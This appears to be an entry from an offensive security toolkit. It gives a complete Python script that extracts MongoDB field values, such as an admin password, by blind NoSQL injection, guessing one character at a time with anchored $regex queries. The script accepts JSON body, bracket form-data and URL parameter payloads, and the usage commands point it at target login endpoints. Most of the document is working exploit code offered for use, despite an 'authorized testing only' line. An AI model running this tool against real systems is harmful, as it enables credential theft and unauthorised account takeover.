entries.title: MongoDB blind extractor ($regex char-by-char)
entries.body:
Extracts a field value from MongoDB **character by character** via the `$regex` operator. Principle: we guess one character at a time, anchoring the already-found prefix at each step and iterating over the alphabet - the server returns TRUE only if a document exists whose value starts that way. It supports **3 request shapes**: JSON body (`{"user":"admin","pass":{"$regex":"..."}}`), bracket notation in form-data (`pass[$regex]=...`) and a parameter in the URL. The TRUE indicator is configured via `--marker` (a substring in the response) or by status code.

> Regex metacharacters (`. * + ? [ ] ( ) { } | \ ^ $`) are escaped automatically so the anchor is not broken. If such characters are expected in the value, extend the alphabet in `--charset`. Extraction is slow by nature: one HTTP request to test each character of the alphabet.

```python
#!/usr/bin/env python3
# mongo_blind.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, json, re, requests
requests.packages.urllib3.disable_warnings()

DEFAULT_CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789!@#$%^&*()_+-=[]{}.,:;"
)

def truth(s, a, regex):
    """Send one request shaped per --shape; return True if MARKER present."""
    rx = {"$regex": regex}
    try:
        if a.shape == "json":
            body = json.loads(a.template.replace("__INJ__", json.dumps(rx)[1:-1]))
            r = s.post(a.url, json=body, verify=False, timeout=20)
        elif a.shape == "bracket":
            data = {a.fixed.split("=")[0]: a.fixed.split("=")[1],
                    f"{a.field}[$regex]": regex}
            r = s.post(a.url, data=data, verify=False, timeout=20)
        else:  # url
            full = a.url.replace("__INJ__", requests.utils.quote(regex))
            r = s.get(full, verify=False, timeout=20)
    except requests.RequestException:
        return False
    return (a.marker in r.text) if a.marker else (r.status_code == a.code)

def extract(s, a):
    found = ""
    while len(found) < a.maxlen:
        prefix = re.escape(found)
        hit = None
        for ch in a.charset:
            if truth(s, a, f"^{prefix}{re.escape(ch)}"):
                hit = ch; break
        if hit is None:
            # no char extends prefix -> check we reached the full value
            if found and truth(s, a, f"^{prefix}$"):
                break
            break
        found += hit
        print(f"    [{len(found):02d}] {found}")
    return found

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL MongoDB blind $regex extractor")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--shape", choices=["json", "bracket", "url"], default="json")
    ap.add_argument("--template", default='{"username":"admin","password":{__INJ__}}',
                    help="JSON body with __INJ__ where the $regex object goes (shape=json)")
    ap.add_argument("--field", default="password", help="target field name (shape=bracket)")
    ap.add_argument("--fixed", default="username=admin", help="fixed k=v sent alongside (shape=bracket)")
    ap.add_argument("-m", "--marker", default="", help="substring present only on TRUE")
    ap.add_argument("--code", type=int, default=200, help="status code meaning TRUE (if no marker)")
    ap.add_argument("--charset", default=DEFAULT_CHARSET)
    ap.add_argument("--maxlen", type=int, default=64)
    a = ap.parse_args()
    s = requests.Session(); s.headers["User-Agent"] = "ARS3NAL-NoSQL/1.0"
    print(f"[*] shape={a.shape} extracting up to {a.maxlen} chars")
    print(f"[=] RESULT: {extract(s, a)!r}")

if __name__ == "__main__":
    main()
```

Run:
```bash
# JSON body: password of user admin
python3 mongo_blind.py -u "https://target/api/login" --shape json \
  --template '{"username":"admin","password":{__INJ__}}' -m "Welcome"
# bracket form-data
python3 mongo_blind.py -u "https://target/login" --shape bracket --field password --fixed "username=admin" -m "dashboard"
# URL parameter (__INJ__ = regex location)
python3 mongo_blind.py -u "https://target/search?user[\$regex]=__INJ__" --shape url --code 200
```
